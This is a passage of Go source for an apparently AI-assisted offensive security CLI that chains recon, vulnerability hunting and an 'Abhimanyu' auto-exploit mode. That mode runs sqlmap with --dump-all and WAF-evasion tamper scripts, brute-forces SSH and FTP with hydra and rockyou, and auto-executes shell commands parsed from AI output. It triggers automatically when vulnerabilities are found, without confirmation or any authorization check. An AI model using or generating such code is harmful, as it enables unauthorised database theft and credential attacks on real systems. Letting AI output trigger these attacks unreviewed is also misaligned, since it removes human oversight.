package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"cybermind-cli/api"
	"cybermind-cli/hunt"
	"cybermind-cli/recon"
	"cybermind-cli/storage"
	"cybermind-cli/ui"
	"cybermind-cli/utils"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

var (
	Version = "2.5.0"
	cyan    = lipgloss.Color("#00FFFF")
	green   = lipgloss.Color("#00FF00")
	purple  = lipgloss.Color("#8A2BE2")
	red     = lipgloss.Color("#FF4444")
	dim     = lipgloss.Color("#777777")
	credit  = lipgloss.Color("#555555")
	yellow  = lipgloss.Color("#FFD700")
)

// getLocalIP returns the local network IP
func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

// getOSLabel returns a styled OS label
func getOSLabel() (string, string) {
	switch runtime.GOOS {
	case "linux":
		return "🐧 Kali Linux", "#268BEE"
	case "windows":
		return "🪟 Windows", "#0078D6"
	case "darwin":
		return "🍎 macOS", "#999999"
	default:
		return runtime.GOOS, "#777777"
	}
}

func printBanner() {
	osLabel, osColor := getOSLabel()
	localIP := getLocalIP()

	lines := []struct{ text, color string }{
		{` ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ███╗██╗███╗   ██╗██████╗ `, "#00FFFF"},
		{`██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗`, "#00CFFF"},
		{`██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║██║  ██║`, "#009FFF"},
		{`██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██║  ██║`, "#7B68EE"},
		{`╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██████╔╝`, "#8A2BE2"},
		{` ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝`, "#9400D3"},
	}

	fmt.Println()
	for _, l := range lines {
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color(l.color)).Render(l.text))
	}
	fmt.Println()

	// Personalized greeting
	greeting := fmt.Sprintf("  ⚡ CyberMind CLI v%s  |  %s", Version,
		lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color(osColor)).Render(osLabel))
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render(greeting))
	fmt.Println(lipgloss.NewStyle().Foreground(credit).Render("  created by github.com/thecnical (Chandan Pandey)"))
	fmt.Println()

	// System info
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  Local IP:  %s", localIP)))

	// Linux-only recon notice
	if runtime.GOOS == "linux" {
		fmt.Println(lipgloss.NewStyle().Foreground(green).Render("  ✓ Auto Recon Mode available  →  cybermind /recon <target>"))
	} else {
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  ℹ  Auto Recon Mode: Linux only"))
	}
	fmt.Println()
}

func printHelp() {
	s := lipgloss.NewStyle().Bold(true).Foreground(cyan)
	d := lipgloss.NewStyle().Foreground(dim)
	g := lipgloss.NewStyle().Foreground(green)
	y := lipgloss.NewStyle().Foreground(yellow)

	fmt.Println()
	fmt.Println(s.Render("  ⚡ CyberMind CLI – Commands"))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 55)))
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(purple).Render("  INTERACTIVE:"))
	fmt.Println(g.Render("  cybermind") + d.Render("                         → start AI chat"))
	fmt.Println()

	if runtime.GOOS == "linux" {
		fmt.Println(y.Render("  🐧 LINUX ONLY — AUTO RECON + HUNT:"))
		fmt.Println(g.Render("  cybermind /recon <target>") + d.Render("       → full auto recon + AI analysis"))
		fmt.Println(g.Render("  cybermind /recon <target> --tools nmap,httpx") + d.Render(" → run specific tools only"))
		fmt.Println(g.Render("  cybermind /hunt <target>") + d.Render("        → vulnerability hunt (XSS, params, CVEs)"))
		fmt.Println(g.Render("  cybermind /hunt <target> --tools dalfox,nuclei") + d.Render(" → specific hunt tools"))
		fmt.Println(g.Render("  cybermind /doctor") + d.Render("              → check all tools, auto-install missing"))
		fmt.Println(g.Render("  cybermind /tools") + d.Render("               → quick tool status check"))
		fmt.Println(g.Render("  cybermind /install-tools") + d.Render("       → install all recon + hunt tools"))
		fmt.Println(g.Render("  cybermind /abhimanyu <target>") + d.Render("  → ⚔️  exploit mode (auto-exploit all vulns)"))
		fmt.Println()
	}

	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(purple).Render("  AI GUIDED:"))
	fmt.Println(g.Render("  cybermind scan <target> [type]") + d.Render("  → AI scan guide"))
	fmt.Println(g.Render("  cybermind recon <target> [type]") + d.Render(" → AI recon guide"))
	fmt.Println(g.Render("  cybermind exploit <vuln>") + d.Render("        → exploitation guide"))
	fmt.Println(g.Render("  cybermind payload <os> [arch]") + d.Render("   → msfvenom payload"))
	fmt.Println(g.Render("  cybermind tool <name> [task]") + d.Render("    → tool usage guide"))
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(purple).Render("  HISTORY:"))
	fmt.Println(g.Render("  cybermind history") + d.Render("               → view chat history"))
	fmt.Println(g.Render("  cybermind clear") + d.Render("                 → clear history"))
	fmt.Println()
}

func printResult(label, result string) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(green).Render("  ⚡ CyberMind AI → " + label))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#E0E0E0")).MarginLeft(2).Render(result))
	fmt.Println()
}

func printError(msg string) {
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ✗ " + msg))
}

// parseToolsFlag parses the target and optional --tools flag from /recon args.
// args is everything after "/recon" (i.e. os.Args[2:])
// Returns target, comma-split tool names (nil if no --tools), and error for unknown tools.
func parseToolsFlag(args []string) (target string, tools []string, err error) {
	if len(args) == 0 {
		return "", nil, fmt.Errorf("target required")
	}
	target = args[0]
	for i := 1; i < len(args); i++ {
		if args[i] == "--tools" && i+1 < len(args) {
			names := strings.Split(args[i+1], ",")
			for _, n := range names {
				n = strings.TrimSpace(n)
				if n != "" {
					tools = append(tools, n)
				}
			}
			i++ // skip the value
		}
	}
	// Validate tool names against registry
	if len(tools) > 0 {
		validNames := recon.ToolNames()
		validSet := make(map[string]bool)
		for _, n := range validNames {
			validSet[n] = true
		}
		for _, t := range tools {
			if !validSet[t] {
				return "", nil, fmt.Errorf("unknown tool %q — valid tools: %s", t, strings.Join(validNames, ", "))
			}
		}
	}
	return target, tools, nil
}

// printReconSummary prints a per-tool status table after recon completes.
func printReconSummary(result recon.ReconResult) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  📋 Recon Summary"))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()

	// Build lookup maps
	toolOutputs := make(map[string]recon.ToolResult)
	for _, tr := range result.Results {
		if tr.Tool != "combined" {
			toolOutputs[tr.Tool] = tr
		}
	}
	failedSet := make(map[string]recon.ToolResult)
	for _, tr := range result.Failed {
		failedSet[tr.Tool] = tr
	}
	skippedSet := make(map[string]recon.SkippedTool)
	for _, s := range result.Skipped {
		skippedSet[s.Tool] = s
	}

	// Print one row per registry tool in phase order
	for _, name := range recon.ToolNames() {
		if tr, ok := toolOutputs[name]; ok {
			if tr.Partial {
				fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
					fmt.Sprintf("  ⚡ %-14s partial — exited non-zero (output kept)", name)))
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
					fmt.Sprintf("  ✓ %-14s done  (%s)", name, tr.Took.Round(time.Millisecond))))
			}
		} else if tr, ok := failedSet[name]; ok {
			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
				fmt.Sprintf("  ✗ %-14s failed — %s", name, tr.Error)))
		} else if s, ok := skippedSet[name]; ok {
			hint := ""
			if s.InstallHint != "" {
				hint = "  (" + s.InstallHint + ")"
			}
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
				fmt.Sprintf("  - %-14s skipped — %s%s", name, s.Reason, hint)))
		}
	}
	fmt.Println()
}

// runAutoRecon runs the full recon pipeline and sends results to AI for analysis.
func runAutoRecon(target string, requested []string) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(yellow).Render("  🔍 AUTO RECON MODE — " + target))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()

	result := recon.RunAutoRecon(target, requested, func(status recon.ToolStatus) {
		switch status.Kind {
		case recon.StatusRunning:
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(
				fmt.Sprintf("  ⟳ %-16s running...", status.Tool)))
		case recon.StatusDone:
			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
				fmt.Sprintf("  ✓ %-16s done (%s)", status.Tool, status.Took.Round(time.Millisecond))))
		case recon.StatusPartial:
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
				fmt.Sprintf("  ⚡ %-16s partial output kept", status.Tool)))
		case recon.StatusFailed:
			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
				fmt.Sprintf("  ✗ %-16s failed — %s", status.Tool, status.Reason)))
		case recon.StatusSkipped:
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
				fmt.Sprintf("  - %-16s skipped — %s", status.Tool, status.Reason)))
		case recon.StatusRetry:
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
				fmt.Sprintf("  ↻ %-16s %s", status.Tool, status.Reason)))
		}
	})

	printReconSummary(result)

	// Fall back to AI guide if no tools ran
	if len(result.Tools) == 0 {
		fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ No recon tools produced output."))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Run: cybermind /install-tools to install recon tools"))
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Falling back to AI recon guide..."))
		result2, err := api.SendRecon(target, "full")
		if err != nil {
			printError(err.Error())
			return
		}
		printResult("Recon Guide → "+target, result2)
		return
	}

	// Build structured payload
	findings := make(map[string]string)
	for _, tr := range result.Results {
		if tr.Tool != "combined" && tr.Output != "" {
			findings[tr.Tool] = tr.Output
		}
	}
	failedNames := make([]string, 0, len(result.Failed))
	for _, tr := range result.Failed {
		failedNames = append(failedNames, tr.Tool)
	}
	skippedNames := make([]string, 0, len(result.Skipped))
	for _, s := range result.Skipped {
		skippedNames = append(skippedNames, s.Tool)
	}

	var ctx recon.ReconContext
	if result.Context != nil {
		ctx = *result.Context
	}

	// Ensure slices are never nil so they marshal as [] not null in JSON
	openPorts := ctx.OpenPorts
	if openPorts == nil {
		openPorts = []int{}
	}
	liveURLs := ctx.LiveURLs
	if liveURLs == nil {
		liveURLs = []string{}
	}
	technologies := ctx.Technologies
	if technologies == nil {
		technologies = []string{}
	}

	payload := api.ReconPayload{
		Target:          target,
		TargetType:      ctx.TargetType,
		ToolsRun:        result.Tools,
		ToolsFailed:     failedNames,
		ToolsSkipped:    skippedNames,
		Findings:        findings,
		SubdomainsFound: len(ctx.Subdomains),
		LiveHostsFound:  len(ctx.LiveHosts),
		OpenPorts:       openPorts,
		WAFDetected:     ctx.WAFDetected,
		WAFVendor:       ctx.WAFVendor,
		LiveURLs:        liveURLs,
		Technologies:    technologies,
		RawCombined:     recon.GetCombinedOutput(result),
	}

	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to AI for analysis..."))
	analysis, err := api.SendAnalysis(payload)
	if err != nil {
		printError("AI analysis failed: " + err.Error())
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("\n  Raw recon output:\n"))
		fmt.Println(recon.GetCombinedOutput(result))
		return
	}

	// Strip markdown before printing
	clean := utils.StripMarkdown(analysis)
	printResult("AI Analysis → "+target, clean)

	_ = storage.AddEntry("/recon "+target, clean)

	// ── Auto-prompt: offer to run /hunt on recon results ──────────────────
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render(
		"  🎯 Recon complete. Start Hunt Mode on these results?"))
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
		"  Hunt will run: gau, waybackurls, katana, x8, dalfox, nuclei, nmap-vuln"))
	fmt.Print(lipgloss.NewStyle().Foreground(lipgloss.Color("#FF6600")).Render("  [y/N] → "))

	var answer string
	fmt.Scanln(&answer)
	answer = strings.ToLower(strings.TrimSpace(answer))

	if answer == "y" || answer == "yes" {
		// Build hunt context from recon results
		huntCtx := &hunt.HuntContext{
			Target:      target,
			TargetType:  ctx.TargetType,
			LiveURLs:    liveURLs,
			OpenPorts:   openPorts,
			WAFDetected: ctx.WAFDetected,
			WAFVendor:   ctx.WAFVendor,
			Subdomains:  ctx.Subdomains,
		}
		runHunt(target, huntCtx, nil)
	} else {
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
			"  Skipped. Run manually: cybermind /hunt " + target))
		fmt.Println()
	}
}

// printHuntSummary prints a per-tool status table after hunt completes.
func printHuntSummary(result hunt.HuntResult) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  🎯 Hunt Summary"))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()

	toolOutputs := make(map[string]hunt.HuntToolResult)
	for _, tr := range result.Results {
		toolOutputs[tr.Tool] = tr
	}
	failedSet := make(map[string]hunt.HuntToolResult)
	for _, tr := range result.Failed {
		failedSet[tr.Tool] = tr
	}
	skippedSet := make(map[string]hunt.HuntSkipped)
	for _, s := range result.Skipped {
		skippedSet[s.Tool] = s
	}

	for _, name := range hunt.HuntToolNames() {
		if tr, ok := toolOutputs[name]; ok {
			if tr.Partial {
				fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
					fmt.Sprintf("  ⚡ %-16s partial — output kept", name)))
			} else {
				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
					fmt.Sprintf("  ✓ %-16s done  (%s)", name, tr.Took.Round(time.Millisecond))))
			}
		} else if tr, ok := failedSet[name]; ok {
			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
				fmt.Sprintf("  ✗ %-16s failed — %s", name, tr.Error)))
		} else if s, ok := skippedSet[name]; ok {
			hint := ""
			if s.InstallHint != "" {
				hint = "  (" + s.InstallHint + ")"
			}
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
				fmt.Sprintf("  - %-16s skipped — %s%s", name, s.Reason, hint)))
		}
	}

	// Print key findings summary
	if result.Context != nil {
		ctx := result.Context
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  🔥 Key Findings"))
		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
			fmt.Sprintf("  XSS confirmed:       %d", len(ctx.XSSFound))))
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
			fmt.Sprintf("  Hidden params found: %d", len(ctx.ParamsFound))))
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
			fmt.Sprintf("  Vulnerabilities:     %d", len(ctx.VulnsFound))))
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
			fmt.Sprintf("  Historical URLs:     %d", len(ctx.HistoricalURLs))))
		fmt.Println()
	}
}

// runHunt runs the full hunt pipeline and sends results to AI for analysis.
// reconCtx can be nil for manual mode (no prior recon).
func runHunt(target string, reconCtx *hunt.HuntContext, requested []string) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  🎯 HUNT MODE — " + target))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()

	if reconCtx != nil {
		fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render(
			fmt.Sprintf("  ℹ  Using recon context: %d live URLs, %d open ports, WAF=%v",
				len(reconCtx.LiveURLs), len(reconCtx.OpenPorts), reconCtx.WAFDetected)))
		fmt.Println()
	}

	result := hunt.RunHunt(target, reconCtx, requested, func(status hunt.HuntStatus) {
		switch status.Kind {
		case hunt.HuntRunning:
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(
				fmt.Sprintf("  ⟳ %-16s running...", status.Tool)))
		case hunt.HuntDone:
			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
				fmt.Sprintf("  ✓ %-16s done (%s)", status.Tool, status.Took.Round(time.Millisecond))))
		case hunt.HuntPartial:
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
				fmt.Sprintf("  ⚡ %-16s partial output kept", status.Tool)))
		case hunt.HuntFailed:
			fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
				fmt.Sprintf("  ✗ %-16s failed — %s", status.Tool, status.Reason)))
		case hunt.HuntKindSkipped:
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
				fmt.Sprintf("  - %-16s skipped — %s", status.Tool, status.Reason)))
		case hunt.HuntRetry:
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
				fmt.Sprintf("  ↻ %-16s %s", status.Tool, status.Reason)))
		}
	})

	printHuntSummary(result)

	if len(result.Tools) == 0 {
		fmt.Println(lipgloss.NewStyle().Foreground(red).Render("  ✗ No hunt tools produced output."))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("  Run: cybermind /install-tools to install all tools"))
		return
	}

	// Build structured payload
	findings := make(map[string]string)
	for _, tr := range result.Results {
		if tr.Output != "" {
			findings[tr.Tool] = tr.Output
		}
	}
	failedNames := make([]string, 0, len(result.Failed))
	for _, tr := range result.Failed {
		failedNames = append(failedNames, tr.Tool)
	}
	skippedNames := make([]string, 0, len(result.Skipped))
	for _, s := range result.Skipped {
		skippedNames = append(skippedNames, s.Tool)
	}

	var ctx hunt.HuntContext
	if result.Context != nil {
		ctx = *result.Context
	}

	xssFound := ctx.XSSFound
	if xssFound == nil {
		xssFound = []string{}
	}
	paramsFound := ctx.ParamsFound
	if paramsFound == nil {
		paramsFound = []string{}
	}
	vulnsFound := ctx.VulnsFound
	if vulnsFound == nil {
		vulnsFound = []string{}
	}
	openPorts := ctx.OpenPorts
	if openPorts == nil {
		openPorts = []int{}
	}

	payload := api.HuntPayload{
		Target:         target,
		TargetType:     ctx.TargetType,
		ToolsRun:       result.Tools,
		ToolsFailed:    failedNames,
		ToolsSkipped:   skippedNames,
		Findings:       findings,
		XSSFound:       xssFound,
		ParamsFound:    paramsFound,
		VulnsFound:     vulnsFound,
		HistoricalURLs: len(ctx.HistoricalURLs),
		WAFDetected:    ctx.WAFDetected,
		WAFVendor:      ctx.WAFVendor,
		OpenPorts:      openPorts,
		RawCombined:    hunt.GetHuntCombinedOutput(result),
	}

	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to AI for vulnerability analysis..."))
	analysis, err := api.SendHunt(payload)
	if err != nil {
		printError("AI analysis failed: " + err.Error())
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render("\n  Raw hunt output:\n"))
		fmt.Println(hunt.GetHuntCombinedOutput(result))
		return
	}

	clean := utils.StripMarkdown(analysis)
	printResult("Hunt Analysis → "+target, clean)
	_ = storage.AddEntry("/hunt "+target, clean)

	// ── Auto-trigger Abhimanyu Mode if critical vulns found ──────────────
	if len(result.Context.VulnsFound) > 0 || len(result.Context.XSSFound) > 0 {
		fmt.Println()
		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render(
			"  ⚔️  ABHIMANYU MODE — Critical vulnerabilities found. Auto-exploiting..."))
		fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(
			"  Entering the Chakravyuh. No retreat."))
		fmt.Println()

		abhimanyuPayload := map[string]interface{}{
			"target_type":   ctx.TargetType,
			"open_ports":    openPorts,
			"live_urls":     payload.XSSFound, // reuse available slice
			"xss_found":     xssFound,
			"vulns_found":   vulnsFound,
			"params_found":  paramsFound,
			"waf_detected":  ctx.WAFDetected,
			"waf_vendor":    ctx.WAFVendor,
			"hunt_findings": findings,
		}

		exploit, exploitErr := api.SendAbhimanyu(target, "all", abhimanyuPayload)
		if exploitErr == nil {
			cleanExploit := utils.StripMarkdown(exploit)
			printResult("⚔️  ABHIMANYU — Exploit Report → "+target, cleanExploit)
			_ = storage.AddEntry("/abhimanyu "+target, cleanExploit)
		} else {
			fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render(
				"  ⚡ Abhimanyu mode failed: " + exploitErr.Error()))
		}
	}
}

// runAbhimanyu runs standalone Abhimanyu exploit mode
func runAbhimanyu(target, vulnType string) {
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  ABHIMANYU MODE — " + target))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#FF4444")).Render("  Entering the Chakravyuh. Fighting every layer. No retreat."))
	fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
	fmt.Println()

	// ── Phase 1: Auto-install missing exploit tools ───────────────────────
	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Checking exploit tools..."))
	exploitTools := []struct{ name, install string }{
		{"sqlmap", "sudo apt install sqlmap -y"},
		{"commix", "sudo apt install commix -y"},
		{"msfconsole", "sudo apt install metasploit-framework -y"},
		{"searchsploit", "sudo apt install exploitdb -y"},
		{"hydra", "sudo apt install hydra -y"},
		{"john", "sudo apt install john -y"},
		{"hashcat", "sudo apt install hashcat -y"},
		{"wpscan", "sudo apt install wpscan -y"},
		{"nikto", "sudo apt install nikto -y"},
		{"crunch", "sudo apt install crunch -y"},
	}
	for _, t := range exploitTools {
		if _, err := exec.LookPath(t.name); err != nil {
			fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s installing...", t.name)))
			parts := strings.Fields(t.install)
			cmd := exec.Command(parts[0], parts[1:]...)
			cmd.Run()
		}
	}

	// ── Phase 2: Run exploit tools based on vuln type ────────────────────
	findings := make(map[string]string)
	lhost := getLocalIP()

	runExploit := func(name string, args []string, timeout int) string {
		fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ %-14s attacking...", name)))
		cmd := exec.Command(name, args...)
		var out strings.Builder
		cmd.Stdout = &out
		cmd.Stderr = &out

		done := make(chan error, 1)
		go func() { done <- cmd.Run() }()
		select {
		case <-done:
		case <-time.After(time.Duration(timeout) * time.Second):
			if cmd.Process != nil {
				cmd.Process.Kill()
			}
		}
		result := out.String()
		if result != "" {
			fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-14s done", name)))
			findings[name] = result
		} else {
			fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  - %-14s no output", name)))
		}
		return result
	}

	u := "https://" + target
	if strings.HasPrefix(target, "http") {
		u = target
	}

	// SQLi — sqlmap full blast
	if vulnType == "all" || vulnType == "sqli" {
		runExploit("sqlmap", []string{
			"-u", u,
			"--batch",           // no user input
			"--level", "5",      // max level
			"--risk", "3",       // max risk
			"--dbs",             // enumerate databases
			"--tables",          // enumerate tables
			"--dump-all",        // dump everything
			"--forms",           // test forms
			"--crawl", "3",      // crawl depth 3
			"--threads", "10",
			"--random-agent",
			"--tamper", "space2comment,between,randomcase",
			"-o",                // optimize
		}, 3600)
	}

	// Command injection — commix
	if vulnType == "all" || vulnType == "cmdi" || vulnType == "rce" {
		runExploit("commix", []string{
			"--url", u,
			"--batch",
			"--level", "3",
			"--all",             // test all parameters
			"--technique", "all",
			"--random-agent",
		}, 1800)
	}

	// Web vuln scan — nikto full
	if vulnType == "all" || vulnType == "web" {
		runExploit("nikto", []string{
			"-h", u,
			"-Tuning", "1234567890abcde",
			"-ssl",
			"-mutate", "1,2,3,4,5,6",
			"-maxtime", "1800",
			"-nointeractive",
		}, 1800)
	}

	// WordPress — wpscan
	if vulnType == "all" || vulnType == "wp" {
		runExploit("wpscan", []string{
			"--url", u,
			"--enumerate", "ap,at,cb,dbe,u,m",
			"--plugins-detection", "aggressive",
			"--random-user-agent",
			"--force",
		}, 1800)
	}

	// Searchsploit — find exploits for detected services
	if vulnType == "all" || vulnType == "cve" {
		runExploit("searchsploit", []string{
			"--json",
			target,
		}, 60)
	}

	// Hydra — brute force common services
	if vulnType == "all" || vulnType == "auth" || vulnType == "brute" {
		for _, service := range []string{"ssh", "ftp", "http-post-form"} {
			if _, err := exec.LookPath("hydra"); err == nil {
				fmt.Println(lipgloss.NewStyle().Foreground(purple).Render(fmt.Sprintf("  ⟳ hydra %-10s brute forcing...", service)))
				var hydraArgs []string
				switch service {
				case "ssh":
					hydraArgs = []string{
						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
						"-P", "/usr/share/wordlists/rockyou.txt",
						"-t", "16", "-f", "-V",
						target, "ssh",
					}
				case "ftp":
					hydraArgs = []string{
						"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
						"-P", "/usr/share/wordlists/rockyou.txt",
						"-t", "16", "-f",
						target, "ftp",
					}
				}
				if len(hydraArgs) > 0 {
					runExploit("hydra", hydraArgs, 1800)
				}
			}
		}
	}

	// ── Phase 3: Send all findings to AI for exploit analysis ─────────────
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Foreground(cyan).Render("  ⟳ Sending to Abhimanyu AI for exploit analysis..."))

	payload := map[string]interface{}{
		"target":    target,
		"vuln_type": vulnType,
		"lhost":     lhost,
		"findings":  findings,
	}

	analysis, err := api.SendAbhimanyu(target, vulnType, payload)
	if err != nil {
		printError("Abhimanyu AI failed: " + err.Error())
		// Print raw findings anyway
		fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  Raw findings:"))
		for tool, output := range findings {
			fmt.Printf("\n=== %s ===\n%s\n", strings.ToUpper(tool), output[:min(len(output), 2000)])
		}
		return
	}

	clean := utils.StripMarkdown(analysis)
	printResult("⚔️  ABHIMANYU Exploit Report → "+target, clean)
	_ = storage.AddEntry("/abhimanyu "+target, clean)

	// ── Phase 4: Auto-execute AI-suggested commands ───────────────────────
	fmt.Println()
	fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ⚔️  Auto-executing exploit commands from AI analysis..."))
	// Extract and run commands from AI output
	for _, line := range strings.Split(clean, "\n") {
		line = strings.TrimSpace(line)
		// Execute lines that look like commands (start with known tools)
		for _, tool := range []string{"sqlmap", "commix", "msfconsole", "hydra", "nikto", "wpscan", "searchsploit", "curl", "nmap"} {
			if strings.HasPrefix(line, tool+" ") {
				fmt.Println(lipgloss.NewStyle().Foreground(yellow).Render("  ⚡ Executing: " + line))
				parts := strings.Fields(line)
				if len(parts) > 0 {
					cmd := exec.Command(parts[0], parts[1:]...)
					cmd.Stdout = os.Stdout
					cmd.Stderr = os.Stderr
					cmd.Run()
				}
				break
			}
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// installPythonPipTool installs a Python tool via pip3.
func installPythonPipTool(name string) error {
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  ↳ pip3 install %s...", name)))
	cmd := exec.Command("pip3", "install", name, "--break-system-packages")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		// Try without --break-system-packages
		cmd2 := exec.Command("pip3", "install", name)
		cmd2.Stdout = os.Stdout
		cmd2.Stderr = os.Stderr
		return cmd2.Run()
	}
	return nil
}

// installPythonGitTool installs a Python tool from git + creates wrapper script.
func installPythonGitTool(name, repoURL, installDir, mainScript string) error {
	fmt.Println(lipgloss.NewStyle().Foreground(dim).Render(fmt.Sprintf("  ↳ Cloning %s from GitHub...", name)))

	exec.Command("sudo", "rm", "-rf", installDir).Run()
	cloneCmd := exec.Command("git", "clone", "--depth=1", repoURL, installDir)
	cloneCmd.Stdout = os.Stdout
	cloneCmd.Stderr = os.Stderr
	if err := cloneCmd.Run(); err != nil {
		return fmt.Errorf("git clone failed: %v", err)
	}

	// Install requirements
	reqFile := installDir + "/requirements.txt"
	if _, err := os.Stat(reqFile); err == nil {
		pipCmd := exec.Command("pip3", "install", "-r", reqFile, "--break-system-packages", "-q")
		pipCmd.Stdout = os.Stdout
		pipCmd.Stderr = os.Stderr
		pipCmd.Run()
	}

	// Create wrapper script
	scriptPath := installDir + "/" + mainScript
	wrapper := fmt.Sprintf("#!/bin/bash\npython3 %s \"$@\"\n", scriptPath)
	wrapperPath := "/usr/local/bin/" + name
	teeCmd := exec.Command("sudo", "tee", wrapperPath)
	teeCmd.Stdin = strings.NewReader(wrapper)
	teeCmd.Run()
